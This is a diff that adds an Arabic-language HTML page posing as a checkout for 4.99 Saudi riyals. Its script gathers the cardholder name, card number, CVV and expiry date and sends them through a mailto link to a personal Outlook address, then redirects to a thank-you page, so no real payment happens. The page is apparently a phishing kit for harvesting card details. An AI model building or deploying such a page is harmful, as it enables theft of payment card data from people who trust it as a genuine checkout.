@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>الدفع</title>
+    <style>
+        body {
+            background-color: #add8e6;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        input, button {
+            margin: 10px;
+            padding: 10px;
+            width: 80%;
+        }
+    </style>
+    <script>
+        function makePayment() {
+            const cardHolderName = document.getElementById('cardHolderName').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cvv = document.getElementById('cvv').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+
+            const body = `اسم حامل البطاقة: ${cardHolderName}\nرقم البطاقة: ${cardNumber}\nCVV: ${cvv}\nتاريخ الانتهاء: ${expiryDate}`;
+
+            window.location.href = `mailto:r-kl22@outlook.com?subject=معلومات الدفع&body=${encodeURIComponent(body)}`;
+            
+            setTimeout(() => {
+                window.location.href = 'thankyou.html';
+            }, 1000);
+        }
+    </script>
+</head>
+<body>
+    <h1>مطلوب مبلغ 4.99 ريال سعودي</h1>
+    <input type="text" id="cardHolderName" placeholder="اسم حامل البطاقة" required>
+    <input type="text" id="cardNumber" placeholder="رقم البطاقة" required>
+    <input type="text" id="cvv" placeholder="CVV" required>
+    <input type="text" id="expiryDate" placeholder="تاريخ الانتهاء" required>
+    <button onclick="makePayment()">الدفع</button>
+</body>
+</html>
